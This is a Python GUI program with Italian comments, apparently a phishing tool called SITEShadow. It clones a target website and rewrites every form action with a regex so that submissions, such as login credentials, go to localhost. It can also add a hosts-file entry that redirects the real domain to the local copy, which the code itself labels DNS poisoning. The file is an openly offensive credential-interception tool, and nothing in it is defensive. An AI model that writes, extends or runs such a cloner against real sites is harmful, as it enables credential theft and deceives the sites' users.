import os
import requests
import threading
import re
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from urllib.parse import urlparse

class SiteShadowGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SITEShadow - Interceptor Unit")
        self.root.geometry("800x600")
        self.root.configure(bg="#0a0a0a")

        # --- HEADER ---
        header = tk.Frame(root, bg="#0a0a0a")
        header.pack(fill="x", pady=10)
        tk.Label(header, text=" SITE SHADOW ", bg="#ff0000", fg="white", font=("Impact", 24)).pack(side="left", padx=20)
        tk.Label(header, text="[INTERCEPTOR MODE ACTIVE]", bg="#0a0a0a", fg="#ff0000", font=("Consolas", 10)).pack(side="left", pady=15)

        # --- CONFIGURAZIONE ---
        cfg_frame = tk.LabelFrame(root, text=" Interception Config ", bg="#0a0a0a", fg="#ff0000", padx=10, pady=10)
        cfg_frame.pack(fill="x", padx=20, pady=10)

        tk.Label(cfg_frame, text="URL TARGET:", bg="#0a0a0a", fg="white").grid(row=0, column=0, sticky="w")
        self.url_entry = tk.Entry(cfg_frame, width=50, bg="#1a1a1a", fg="#ff0000", borderwidth=0)
        self.url_entry.grid(row=0, column=1, padx=10)
        self.url_entry.insert(0, "https://")

        self.dns_var = tk.BooleanVar(value=False)
        tk.Checkbutton(cfg_frame, text="ATTIVA HOSTS REDIRECT (Richiede Admin)", variable=self.dns_var, 
                       bg="#0a0a0a", fg="white", selectcolor="#000").grid(row=1, column=1, sticky="w")

        # --- LOG TERMINAL ---
        self.log_box = tk.Text(root, bg="#000", fg="#00ff00", font=("Consolas", 9), height=15)
        self.log_box.pack(fill="both", expand=True, padx=20, pady=10)

        # --- ACTION BUTTONS ---
        btn_frame = tk.Frame(root, bg="#0a0a0a")
        btn_frame.pack(fill="x", pady=10)

        self.start_btn = tk.Button(btn_frame, text="DEPLOY INTERCEPTOR", command=self.start_op, 
                                   bg="#ff0000", fg="white", font=("Arial", 10, "bold"), width=25)
        self.start_btn.pack(side="left", padx=20)

    def log(self, msg, color="#00ff00"):
        self.log_box.insert(tk.END, f"[*] {msg}\n")
        self.log_box.see(tk.END)

    # --- TUE FUNZIONI INTEGRATE ---

    def manage_hosts(self, domain, remove=False):
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        entry = f"127.0.0.1 {domain}\n"
        try:
            if not os.path.exists(hosts_path): return
            with open(hosts_path, "r") as f:
                lines = f.readlines()
            
            if remove:
                with open(hosts_path, "w") as f:
                    for line in lines:
                        if domain not in line: f.write(line)
                self.log(f"Redirect rimosso per {domain}", "#ff0")
            else:
                if not any(domain in line for line in lines):
                    with open(hosts_path, "a") as f: f.write(entry)
                self.log(f"Redirect HOSTS attivo: {domain} -> 127.0.0.1", "#ff0")
        except Exception as e:
            self.log(f"ERRORE HOSTS: {e} (Esegui come ADMIN)", "#f00")

    def clone_and_intercept(self, url, folder):
        site_path = os.path.join(folder, 'cloned_sites', 'active_site')
        os.makedirs(site_path, exist_ok=True)
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        try:
            self.log(f"Mirroring & Injection su: {url}...")
            r = requests.get(url, headers=headers, timeout=10)
            
            # Cambia le action dei form per catturare i dati localmente (TUA LOGICA RE)
            html = re.sub(r'action=["\']http[s]?://.*?["\']', 'action="/"', r.text)
            
            # Iniezione aggiuntiva: salviamo anche le risorse base
            with open(os.path.join(site_path, "index.html"), "w", encoding="utf-8") as f:
                f.write(html)
            
            self.log("INJECTION COMPLETATA: Form reindirizzati a LOCALHOST.")
            return True
        except Exception as e:
            self.log(f"ERRORE MIRRORING: {e}", "#f00")
            return False

    # --- ENGINE ---

    def start_op(self):
        url = self.url_entry.get().strip()
        domain = urlparse(url).netloc
        
        if not domain:
            messagebox.showerror("Errore", "URL non valido.")
            return

        save_dir = filedialog.askdirectory()
        if not save_dir: return

        self.start_btn.config(state="disabled")
        
        def run():
            # 1. Clonazione e Iniezione
            success = self.clone_and_intercept(url, save_dir)
            
            # 2. DNS Poisoning locale (se selezionato)
            if success and self.dns_var.get():
                self.manage_hosts(domain)
            
            if success:
                self.log(f"OPERAZIONE COMPLETATA. Sito pronto in: {save_dir}")
                messagebox.showinfo("SITEShadow", "Interceptor pronto!")
            
            self.start_btn.config(state="normal")

        threading.Thread(target=run, daemon=True).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = SiteShadowGUI(root)
    root.mainloop()